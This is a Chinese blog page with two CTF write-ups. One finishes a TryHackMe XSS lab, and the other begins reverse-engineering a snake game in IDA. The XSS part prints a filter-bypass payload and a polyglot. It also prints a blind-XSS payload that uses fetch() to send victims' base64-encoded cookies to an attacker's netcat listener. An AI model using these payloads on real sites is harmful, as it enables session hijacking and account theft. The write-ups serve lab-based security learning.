<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/images/cat.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>尝试 level two 的 payload ，变化后的源代码如下：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span><span class="attr">scriptalert</span>('<span class="attr">THM</span>');/<span class="attr">script</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现<code>&lt;</code>、<code>&gt;</code>这两个符号被过滤了，为了绕过过滤器，我们可以利用<code>img</code>标签的其他属性，例如<code>onload</code>事件，一旦<code>src</code>属性中指定的图像加载到网页上，该事件将执行指定的代码。因此
payload 为：<code>/images/cat.jpg" onload="alert('THM');</code>。</p>
<p>得到flag：<code>THM{XSS_MASTER}</code>。</p>
<h3 id="polyglots">Polyglots</h3>
<p>XSS polyglot 是一串文本，算是通用 payload
，可以闭合属性、闭合标签以及绕过过滤器。
你可以在刚刚完成的六个关卡中使用以下 payload，并且都会成功执行。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</span><br></pre></td></tr></tbody></table></figure>
<h3 id="blind-xss-1">Blind XSS</h3>
<p>在目标网站上创建新用户，然后在 <strong>Support Tickets</strong>
选项并创建新的 <strong>Ticket</strong> ，如下图所示：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110232709300.png" alt="image-20230110232709300">
<figcaption aria-hidden="true">image-20230110232709300</figcaption>
</figure>
<p>然后点击该 ticket 的 id 号跳转到 ticket
详情页面，查看该页面源代码，发现关键字：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Status:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> Open<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Id:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Subject:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Created:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 10/01/2023 15:26<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Contents:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span>hahaha<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>重新创建一个 ticket
，尝试使用<code>&lt;/textarea&gt;hahaha</code>闭合<code>textarea</code>标签，结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233248687.png" alt="image-20230110233248687" style="zoom:80%;"></p>
<p>为了验证我们是否可以运行 JavaScript ，于是接着尝试 payload
：<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>，点击查看对应的
ticket ，出现弹窗：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110233514586.png" alt="image-20230110233514586">
<figcaption aria-hidden="true">image-20230110233514586</figcaption>
</figure>
<p>通过上述操作证实了 XSS
漏洞的存在，接着我们可以通过从另一个用户那里提取的 cookie
信息去劫持他们的登录会话以提高我们的权限。为了做到这一点，我们构建的
payload 需要能够提取用户的 cookie
信息并将其导出到我们选择的另一台web服务器上。首先，我们需要设置监听服务器来接收信息，也就是刚刚提到的“另一台web服务器”。</p>
<p>使用 <strong>Netcat</strong> 设置监听服务器（攻击者的服务器）：</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nlvp 9001</span><br></pre></td></tr></tbody></table></figure>
<p>然后就是构建 payload
，格式为：<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code>。下面是对
payload 的解析：</p>
<ul>
<li><code>&lt;/textarea&gt;</code>标签的作用是闭合。</li>
<li><code>&lt;script&gt;</code>标签是为了打开一个编写 JavaScript
代码的区域。</li>
<li><code>fetch()</code>命令的作用是发出 HTTP 请求。</li>
<li><code>{URL_OR_IP}</code>是 THM 请求捕获器的 URL 或 THM Attackbox 的
IP 地址或你在THM VPN网络上的IP地址。（也就是监听服务器的 IP 地址）</li>
<li><code>?cookie=</code>是包含受害者 cookie 的查询字符串(query
string)。</li>
<li><code>btoa()</code>命令的作用是对受害者的 cookie 进行
base64编码。</li>
<li><code>document.cookie</code>用于获取 Acme IT Support 网站上受害者的
cookie 。</li>
<li><code>&lt;/script&gt;</code>用于关闭 JavaScript 代码区域。</li>
</ul>
<p>接下来就是利用具体的 payload 实现 XSS 攻击：创建一个新的 ticket
，填入 payload
：<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.43.251:9001?cookie=' + btoa(document.cookie));&lt;/script&gt;</code>，创建完毕后，查看终端，得到结果：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230111100430594.png" alt="image-20230111100430594">
<figcaption aria-hidden="true">image-20230111100430594</figcaption>
</figure>
<p>最后通过 base64 解码得到 cookie
值：<code>4AB305E55955197693F01D6F8FD2D321</code>。</p>
<p>注：我一开始是使用自己的计算机，通过 openvpn
获取一个IP地址，然后在自己的计算机上进行实验，但是无法监听到结果，后来在浏览器使用
Attackbox ，得到结果。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/nssctf-%E8%B4%AA%E9%A3%9F%E8%9B%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/nssctf-%E8%B4%AA%E9%A3%9F%E8%9B%87/" class="post-title-link" itemprop="url">Reverse-贪食蛇</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-10 15:50:30" itemprop="dateCreated datePublished" datetime="2023-06-10T15:50:30+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="nssctf-reverse-贪食蛇">NSSCTF-Reverse-贪食蛇</h1>
<p>题目来自于NSSCTF: SWPU NSS新生赛（校外通道）</p>
<p>下载附件，用IDA打开，首先按 shift+F12 打开 String
窗口，没发现什么，于是直接 F5 查看伪代码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  __main();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    gameStartMenu();</span><br><span class="line">    gameMainLoop();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>双击查看各个函数，发现主要的代码实现在<code>gameMainLoop()</code>函数中，两百多行代码看不出什么来，我便准备运行该程序：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929205947106.png" alt="image-20220929205947106">
<figcaption aria-hidden="true">image-20220929205947106</figcaption>
</figure>
<p>要得到 60
分以上才能得到flag，玩了一局发现有点难度，猜想能够修改判断条件，将 60
分改成 1 分不就轻松了吗。再次查看<code>gameMainLoop()</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gameMainLoop</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+2Dh] [ebp-ECBh]</span></span><br><span class="line">  _BYTE v12[<span class="number">3</span>]; <span class="comment">// [esp+31h] [ebp-EC7h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+50Ch] [ebp-9ECh]</span></span><br><span class="line">  <span class="type">int</span> v14[<span class="number">625</span>]; <span class="comment">// [esp+510h] [ebp-9E8h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+ED7h] [ebp-21h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+ED8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+EDFh] [ebp-19h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+EE0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+EE4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp+EE8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+EECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  gameBegin();</span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">1u</span>);</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)v0);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    v21 = <span class="number">12</span>;</span><br><span class="line">    v20 = <span class="number">12</span>;</span><br><span class="line">    v19 = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; i += <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v1 = <span class="number">624</span> - i;</span><br><span class="line">      v2 = <span class="number">25</span> * i;</span><br><span class="line">      v3 = <span class="number">25</span> * (i + <span class="number">1</span>) - <span class="number">1</span>;</span><br><span class="line">      v14[v3] = <span class="number">-2</span>;</span><br><span class="line">      v14[v2] = v14[v3];</span><br><span class="line">      v14[v1] = v14[v2];</span><br><span class="line">      v14[i] = v14[v1];</span><br><span class="line">    }</span><br><span class="line">    v17 = <span class="number">100</span>;</span><br><span class="line">    v15 = <span class="number">3</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(</span><br><span class="line">      (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)v12 &amp; <span class="number">0xFFFFFFFC</span>),</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">4</span> * (((<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">char</span> *)&amp;v11 - ((<span class="type">unsigned</span> <span class="type">int</span>)v12 &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">1251</span>) &amp; <span class="number">0xFFFFFFFC</span>) &gt;&gt; <span class="number">2</span>));</span><br><span class="line">    sprintf_s(&amp;v11, <span class="number">32</span>, <span class="string">"mode con: cols=%d lines=%d"</span>, <span class="number">50</span>, <span class="number">25</span>);</span><br><span class="line">    system((<span class="type">const</span> <span class="type">char</span> *)&amp;v11);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">2</span>; j; --j )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        i = rand() % <span class="number">625</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v14[i] );</span><br><span class="line">      v14[i] = <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    system(<span class="string">"title GluttonousSnake"</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( _kbhit() )</span><br><span class="line">      {</span><br><span class="line">        v15 = _getch();</span><br><span class="line">        <span class="keyword">if</span> ( v15 )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">switch</span> ( v15 )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">case</span> <span class="number">27</span>:</span><br><span class="line">              <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">              <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">              _getch();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">65</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">75</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">97</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">100</span> )</span><br><span class="line">                v17 = <span class="number">97</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">68</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">77</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">97</span> )</span><br><span class="line">                v17 = <span class="number">100</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">87</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">119</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">115</span> )</span><br><span class="line">                v17 = <span class="number">119</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">83</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">115</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">119</span> )</span><br><span class="line">                v17 = <span class="number">115</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( v17 == <span class="number">100</span> )</span><br><span class="line">      {</span><br><span class="line">        v5 = v21 &gt; <span class="number">23</span> ? <span class="number">-24</span> : <span class="number">1</span>;</span><br><span class="line">        v21 += v5;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v17 &gt; <span class="number">100</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v17 == <span class="number">115</span> )</span><br><span class="line">        {</span><br><span class="line">          v6 = v20 &gt; <span class="number">23</span> ? <span class="number">-24</span> : <span class="number">1</span>;</span><br><span class="line">          v20 += v6;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v17 == <span class="number">119</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( v20 &lt;= <span class="number">0</span> )</span><br><span class="line">            v7 = <span class="number">-24</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v7 = <span class="number">1</span>;</span><br><span class="line">          v20 -= v7;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v17 == <span class="number">97</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v21 &lt;= <span class="number">0</span> )</span><br><span class="line">          v4 = <span class="number">-24</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v4 = <span class="number">1</span>;</span><br><span class="line">        v21 -= v4;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( v14[<span class="number">25</span> * v20 + v21] &gt; <span class="number">1</span> || v14[<span class="number">25</span> * v20 + v21] == <span class="number">-2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v14[<span class="number">25</span> * v20 + v21] == <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v19;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          i = rand() % <span class="number">625</span>;</span><br><span class="line">        <span class="keyword">while</span> ( v14[i] );</span><br><span class="line">        v14[i] = <span class="number">-1</span>;</span><br><span class="line">        sprintf_s(&amp;v11, <span class="number">32</span>, <span class="string">"title score:%d"</span>, v19 - <span class="number">4</span>);</span><br><span class="line">        system((<span class="type">const</span> <span class="type">char</span> *)&amp;v11);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">624</span>; ++i )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( v14[i] &gt; <span class="number">0</span> )</span><br><span class="line">            --v14[i];</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      v14[v21 + <span class="number">25</span> * v20] = v19;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1249</span>; ++i )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v14[i / <span class="number">2</span>] )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( v14[i / <span class="number">2</span>] &lt;= <span class="number">0</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( v14[i / <span class="number">2</span>] == <span class="number">-2</span> )</span><br><span class="line">            {</span><br><span class="line">              <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">                v9 = <span class="number">93</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v9 = <span class="number">91</span>;</span><br><span class="line">              *((_BYTE *)&amp;v11 + i) = v9;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">              *((_BYTE *)&amp;v11 + i) = <span class="number">48</span>;</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">              v8 = <span class="number">41</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v8 = <span class="number">40</span>;</span><br><span class="line">            *((_BYTE *)&amp;v11 + i) = v8;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          *((_BYTE *)&amp;v11 + i) = <span class="number">32</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      system(<span class="string">"cls"</span>);</span><br><span class="line">      <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v11);</span><br><span class="line">      sub_4020C0(v19);</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( isFlag )</span><br><span class="line">    {</span><br><span class="line">      decode_flag(&amp;t_flag);</span><br><span class="line">      <span class="built_in">strcat</span>(s_flag, &amp;t_flag);</span><br><span class="line">      gameEndmenu(v19, s_flag);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      gameEndmenu(v19, flag);</span><br><span class="line">    }</span><br><span class="line">    result = _getch();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( result == <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在第 192 行发现<code>sub_4020C0()</code>函数，双击查看</p>
